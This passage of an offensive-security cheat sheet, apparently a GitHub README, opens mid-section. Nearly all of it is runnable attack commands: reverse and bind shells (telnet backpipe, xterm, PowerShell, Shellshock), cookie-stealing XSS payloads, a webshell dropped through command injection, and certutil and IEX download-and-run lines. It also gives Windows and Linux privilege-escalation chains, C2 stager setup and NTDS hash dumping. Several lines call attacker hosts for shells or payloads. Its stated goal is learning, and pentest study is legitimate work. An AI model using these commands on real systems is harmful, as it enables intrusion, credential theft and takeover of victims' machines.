# If netcat is not available or /dev/tcp
mknod backpipe p && telnet attackerip 443 0<backpipe | /bin/bash 1>backpipe
```
### XTERM Reverse Shell

```
# Start an open X Server on your system (:1 – which listens on TCP port 6001)
apt-get install xnest
Xnest :1

# Then remember to authorise on your system the target IP to connect to you
xterm -display 127.0.0.1:1

# Run this INSIDE the spawned xterm on the open X Server
xhost +targetip

# Then on the target connect back to the your X Server
xterm -display attackerip:1
/usr/openwin/bin/xterm -display attackerip:1
or
$ DISPLAY=attackerip:0 xterm
```
### XSS Cheat Codes

```
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
("< iframes > src=http://IP:PORT </ iframes >")

<script>document.location=http://IP:PORT</script>

';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//–></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

";!–"<XSS>=&amp;amp;{()}

<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"">
<IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>

<IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
<IMG SRC="jav ascript:alert('XSS');">

perl -e 'print "<IMG SRC=javascript:alert(\"XSS\")>";' > out

<BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")>

(">< iframes http://google.com < iframes >)

<BODY BACKGROUND="javascript:alert('XSS')">
<FRAMESET><FRAME SRC=”javascript:alert('XSS');"></FRAMESET>
"><script >alert(document.cookie)</script>
%253cscript%253ealert(document.cookie)%253c/script%253e
"><s"%2b"cript>alert(document.cookie)</script>
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E
<img src=asdf onerror=alert(document.cookie)>
```
### SSH Over SCTP (With Socat)

```
# on remote server
# assuming you want the SCTP socket to listen on port 80/SCTP and sshd is on 22/TCP
$ socat SCTP-LISTEN:80,fork TCP:localhost:22

# localhost
# replace SERVER_IP with IP of listening server, and 80 with whatever port the SCTP listener is on :)
$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80

# create socks proxy
# replace username and -p port value as needed...
$ ssh -lusername localhost -D 8080 -p 1337
```
### Install Metasploit Community Edition in Kali 2.0

```
# github urls
https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version

wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run && chmod
+x metasploit-latest-linux-x64-installer.run && ./metasploit-latest-linux-x64-installer.run

# create user
$ /opt/metasploit/createuser
[*] Please enter a username: root
[*] Creating user 'root' with password 'LsRRV[I^5' ...

# activate your metasploit license
https://localhost:3790

# update metasploite
$ /opt/metasploit/app/msfupdate

# use msfconsole
$ /opt/metasploit/app/msfconsole
```
### Tor Nat Traversal

```
# install to server
$ apt-get install tor torsocks

# bind ssh to tor service port 80
# /etc/tor/torrc
SocksPolicy accept 127.0.0.1
SocksPolicy accept 192.168.0.0/16
Log notice file /var/log/tor/notices.log
RunAsDaemon 1
HiddenServiceDir /var/lib/tor/ssh_hidden_service/
HiddenServicePort 80 127.0.0.1:22
PublishServerDescriptor 0
$ /etc/init.d/tor start
$ cat /var/lib/tor/ssh_hidden_service/hostname
3l5zstvt1zk5jhl662.onion

# ssh connect from client
$ apt-get install torsocks
$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80
```
### DNS brute forcing with fierce

```
# http://ha.ckers.org/fierce/
$ ./fierce.pl -dns example.com
$ ./fierce.pl –dns example.com –wordlist myWordList.txt
```
### Metagoofil metadata gathering tool

```
# http://www.edge-security.com/metagoofil.php
#automate search engine document retrieval and analysis. It also has the capability to provide MAC
# addresses, username listings, and more
$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html
```
### A best NMAP scan strategy

```
# A best nmap scan strategy for networks of all sizes

# Host Discovery - Generate Live Hosts List
$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24
$ grep "Status: Up" Discovery.gnmap | cut -f 2 -d ' ' > LiveHosts.txt

# Port Discovery - Most Common Ports
# http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf
$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt
$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt

# Port Discovery - Full Port Scans (UDP is very slow)
$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt

# Print TCP\UDP Ports
$ grep "open" FullTCP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '{print "T:"$0}'
$ grep "open" FullUDP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '{print "U:"$0}'

# Detect Service Version
$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt

# Operating System Scan
$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt

# OS and Service Detect
$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
```
### Nmap – Techniques for Avoiding Firewalls

```
# fragmentation
$ nmap -f

# change default MTU size number must be a multiple of 8 (8,16,24,32 etc)
$ nmap --mtu 24

# Generates a random number of decoys
$ nmap -D RND:10 [target]

# Manually specify the IP addresses of the decoys
$ nmap -D decoy1,decoy2,decoy3 etc.

# Idle Zombie Scan, first t need to find zombie ip
$ nmap -sI [Zombie IP] [Target IP]

# Source port number specification
$ nmap --source-port 80 IP

# Append Random Data to scan packages
$ nmap --data-length 25 IP

# MAC Address Spoofing, generate different mac for host pc
$ nmap --spoof-mac Dell/Apple/3Com IP
```
### Exploit servers to Shellshock

```
# A tool to find and exploit servers vulnerable to Shellshock
# https://github.com/nccgroup/shocker
$ ./shocker.py -H 192.168.56.118  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose

# cat file
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80

# bind shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80

# reverse Shell
$ nc -l -p 443
$ echo "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80
```
### Root with Docker

```
# get root with docker
# user must be in docker group
ek@victum:~/docker-test$ id
uid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)

ek@victum:~$ mkdir docker-test
ek@victum:~$ cd docker-test

ek@victum:~$ cat > Dockerfile
FROM debian:wheezy

ENV WORKDIR /stuff

RUN mkdir -p $WORKDIR

VOLUME [ $WORKDIR ]

WORKDIR $WORKDIR
<< EOF

ek@victum:~$ docker build -t my-docker-image .
ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \
'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh'
./sh
whoami
# root

ek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c 'cat /stuff/shadow'
```
### Tunneling Over DNS to Bypass Firewall

```
# Tunneling Data and Commands Over DNS to Bypass Firewalls
# dnscat2 supports "download" and "upload" commands for getting files (data and programs) to and from # the victim’s host.

# server (attacker)
$ apt-get update
$ apt-get -y install ruby-dev git make g++
$ gem install bundler
$ git clone https://github.com/iagox86/dnscat2.git
$ cd dnscat2/server
$ bundle install
$ ruby ./dnscat2.rb
dnscat2> New session established: 16059
dnscat2> session -i 16059

# client (victum)
# https://downloads.skullsecurity.org/dnscat2/
# https://github.com/lukebaggett/dnscat2-powershell
$ dnscat --host <dnscat server_ip>
```
### Compile Assemble code

```
nasm -f elf32 simple32.asm -o simple32.o
ld -m elf_i386 simple32.o simple32

nasm -f elf64 simple.asm -o simple.o
ld simple.o -o simple
```
### Pivoting to Internal Network Via Non Interactive Shell

```
# generate ssh key with shell
$ wget -O - -q "http://domain.tk/sh.php?cmd=whoami"
$ wget -O - -q "http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \"\" "
$ wget -O - -q "http://domain.tk/sh.php?cmd=cat /tmp/id_rsa"

# add tempuser at attacker ps
$ useradd -m tempuser
$ mkdir /home/tempuser/.ssh && chmod 700 /home/tempuser/.ssh
$ wget -O - -q "http://domain.tk/sh.php?cmd=cat /tmp/id_rsa" > /home/tempuser/.ssh/authorized_keys
$ chmod 700 /home/tempuser/.ssh/authorized_keys
$ chown -R tempuser:tempuser /home/tempuser/.ssh

# create reverse ssh shell
$ wget -O - -q "http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@<attacker_ip>"
```
### Patator is a multi-purpose brute-forcer

```
# git clone https://github.com/lanjelot/patator.git /usr/share/patator

# SMTP bruteforce
$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
$ patator smtp_login host=192.168.17.129 helo='ehlo 192.168.17.128' user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep='incorrect password or account name'
```
### Metasploit Web terminal via Gotty

```
$ service postgresql start
$ msfdb init
$ apt-get install golang
$ mkdir /root/gocode
$ export GOPATH=/root/gocode
$ go get github.com/yudai/gotty
$ gocode/bin/gotty -a 127.0.0.1 -w msfconsole
# open in browser http://127.0.0.1:8080
```
### Get full shell with POST RCE

```
attacker:~$ curl -i -s -k  -X 'POST' --data-binary $'IP=%3Bwhoami&submit=submit' 'http://victum.tk/command.php'

attacker:~$ curl -i -s -k  -X 'POST' --data-binary $'IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&submit=submit' 'http://victum.tk/command.php'

attacker:~$ curl http://victum.tk/shell.php?cmd=id

# download reverse shell to server (phpshell.php)
http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27

# run nc and execute phpshell.php
attacker:~$ nc -nvlp 1337
```
### Exiftool - Read and write meta information in files

```
$ wget http://www.sno.phy.queensu.ca/~phil/exiftool/Image-ExifTool-10.13.tar.gz
$ tar xzf Image-ExifTool-10.13.tar.gz
$ cd Image-ExifTool-10.13
$ perl Makefile.PL
$ make
$ ./exiftool main.gif
```
### Get SYSTEM with Admin reverse_shell on Win7

```
msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe > danger.exe

#show account settings
net user <login>

# download psexec to kali
https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx

# upload psexec.exe file onto the victim machine with powershell script
echo $client = New-Object System.Net.WebClient > script.ps1
echo $targetlocation = "http://192.168.56.102/PsExec.exe" >> script.ps1
echo $client.DownloadFile($targetlocation,"psexec.exe") >> script.ps1
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1

# upload danger.exe file onto the victim machine with powershell script
echo $client = New-Object System.Net.WebClient > script2.ps1
echo $targetlocation = "http://192.168.56.102/danger.exe" >> script2.ps1
echo $client.DownloadFile($targetlocation,"danger.exe") >> script2.ps1
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1

# UAC bypass from precompiled binaries:
https://github.com/hfiref0x/UACME

# upload https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe to victim pc with powershell
echo $client = New-Object System.Net.WebClient > script2.ps1
echo $targetlocation = "http://192.168.56.102/Akagi64.exe" >> script3.ps1
echo $client.DownloadFile($targetlocation,"Akagi64.exe") >> script3.ps1
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1

# create listener on kali
nc -lvp 4444

# Use Akagi64 to run the danger.exe file with SYSTEM privileges
Akagi64.exe 1 C:\Users\User\Desktop\danger.exe

# create listener on kali
nc -lvp 4444

# The above step should give us a reverse shell with elevated privileges
# Use PsExec to run the danger.exe file with SYSTEM privileges
psexec.exe –i –d –accepteula –s danger.exe
```
### Get SYSTEM with Standard user reverse_shell on Win7

```
https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051
https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html
https://www.exploit-db.com/exploits/37049/

# check the list of patches applied on the target machine
# to get the list of Hotfixes installed, type in the following command.
wmic qfe get
wmic qfe | find "3057191"

# Upload compile exploit to victim machine and run it
https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe

# by default exploite exec cmd.exe with SYSTEM privileges, we need to change source code to run danger.exe
# https://github.com/hfiref0x/CVE-2015-1701 download it and navigate to the file "main.c"

# dump clear text password of the currently logged in user using wce.exe
http://www.ampliasecurity.com/research/windows-credentials-editor/
wce -w

# dump hashes of other users with pwdump7
http://www.heise.de/download/pwdump.html
# we can try online hash cracking tools such crackstation.net
```
### Generate our own dic file based on the website content

```
$ cewl -m 4 -w dict.txt http://site.url
$ john --wordlist=dict.txt --rules --stdout
```
### Bruteforce DNS records using Nmap

```
$ nmap --script dns-brute --script-args dns-brute.domain=foo.com,dns-brute.threads=6,dns-brute.hostlist=./hostfile.txt,newtargets -sS -p 80
$ nmap --script dns-brute www.foo.com
```
### Identifying a WAF with Nmap

```
$ nmap -p 80,443 --script=http-waf-detect 192.168.56.102
$ nmap -p 80,443 --script=http-waf-fingerprint 192.168.56.102
$ wafw00f www.hamza.com
```
### MS08-067 - without the use of Metasploit

```
$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205
$ searchsploit ms08-067
$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1
```
### Nikto scan with SQUID proxy

```
$ nikto -useproxy http://squid_ip:3128 -h http://target_ip
```
### Hijack a binary’s full path in bash to exec your own code

```
$ function /usr/bin/foo () { /usr/bin/echo "It works"; }
$ export -f /usr/bin/foo
$ /usr/bin/foo
# It works ;)
```
### Local privilege escalation through MySQL run with root privileges

```
# Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)
$ wget 0xdeadbeef.info/exploits/raptor_udf2.c
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/user/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
mysql> select do_system('echo "root:passwd" | chpasswd > /tmp/out; chown user:user /tmp/out');

user:~$ su -
Password:
user:~# whoami
root
root:~# id
uid=0(root) gid=0(root) groups=0(root)
```
### Bruteforce SSH login with patator

```
root:~# patator ssh_login host=192.168.0.18 user=FILE0 password=FILE1 0=word.txt 1=word.txt -x ignore:mesg='Authentication failed.'
```
### Using LD_PRELOAD to inject features to programs

```
$ wget https://github.com/jivoi/pentest/ldpreload_shell.c
$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so
$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft
```
### Exploit the OpenSSH User Enumeration Timing Attack

```
# https://github.com/c0r3dump3d/osueta
$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes
$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt
```
### Create a TCP circuit through validly formed HTTP requests with ReDuh

```
# https://github.com/sensepost/reDuh

# step 1
# upload reDuh.jsp to victim server
$ http://192.168.10.50/uploads/reDuh.jsp

# step 2
# run reDuhClient on attacker
$ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp

# step 3
# connecting to management port with nc
$ nc -nvv 127.0.0.1 1010

# step 4
# forward localport to remote port with tunnel
[createTunnel] 7777:172.16.0.4:3389

# step 5
# connect to localhost with rdp
$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777
```

# Powershell Reverse Shell

change IP and Port / Limmited version
```
$sm=(New-Object Net.Sockets.TCPClient('192.168.1.11',9001)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

# Donwload file to Victim machine
```
cmd /c certutil -urlcache -split -f http://127.0.0.1/shell.exe c:\Temp\shell.exe && C:\temp\shell.exe
```
```
powershell -v 2 -exec bypass IEX(New-Object Net.WebClient).downloadString("http://127.0.0.1/shell.ps1")
```

# C&C

## Merlin

Compile and run server

```
$ cd merlin/cmd/merlinserver
$ go build
$ sudo ./merlinServer-Linux-x64 -i 192.168.1.11 -p 8443
```

Compile agent

```
$ cd merlin/cmd/merlinagent
$ sudo GOOS=windows GOARCH=386 go build
```


Generate Certificate

```
$ cd merlin/data/x509
$ openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out server.crt -subj "/CN=lab.com" -days 365
```

## Koadic

```
$ cd koadic
$ ./koadic
                           / \
     _                   _ | |
    | | _____   __ _  __| || |  ___
    | |/ / _ \ / _` |/ _` ||.| / __|
    |   / (o) | (_| | (_| ||.|| (__
    |_|\_\_^_/ \__,_|\__,_||:| \___|
                           |:|
                        ~\==8==/~
                            8
                            O

        -{ COM Command & Control }-
      Windows Post-Exploitation Tools
             Endless Intellect

            ~[ Version:  0xA ]~
            ~[ Stagers:    5 ]~
            ~[ Implants:  33 ]~

(koadic: sta/js/mshta)$ info

        NAME        VALUE               REQ     DESCRIPTION     
        -----       ------------        ----    -------------   
        SRVHOST     192.168.1.11        yes     Where the stager should call home
        SRVPORT     9999                yes     The port to listen for stagers on
        EXPIRES                         no      MM/DD/YYYY to stop calling home
        KEYPATH                         no      Private key for TLS communications
        CERTPATH                        no      Certificate for TLS communications
        MODULE                          no      Module to run once zombie is staged

(koadic: sta/js/mshta)$ set SRVPORT 1245
[+] SRVPORT => 1245
(koadic: sta/js/mshta)$ run 
[+] Spawned a stager at http://192.168.1.11:1245/c26qp
[!] Don't edit this URL! (See: 'help portfwd')
[>] mshta http://192.168.1.11:1245/c26qp

```

# Donwload file to the victim machine
```
bitsadmin  /transfer mydownloadjob  /download  /priority normal  ^http://example.com/filename.zip  C:\Users\username\Downloads\filename.zip
```
# Internal Monolog
Retrieving NTLM Hashes without Touching LSASS

https://github.com/eladshamir/Internal-Monologue

# NTDS - Domain Controller
Dumping and enumerating NTDS.dit - a file that contains information about Active Directory users (hashes!).

```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
Dump hashes 
```
/usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
```

### Contribute
As an open source we a strong focus on the community We welcome contributions as github pull requests.
Kudos and thanks for the people who did the hard stuff
</br>
# Goal
* Understand how the attacks can be performed
* Try out various industry tools and become more profficient in using them
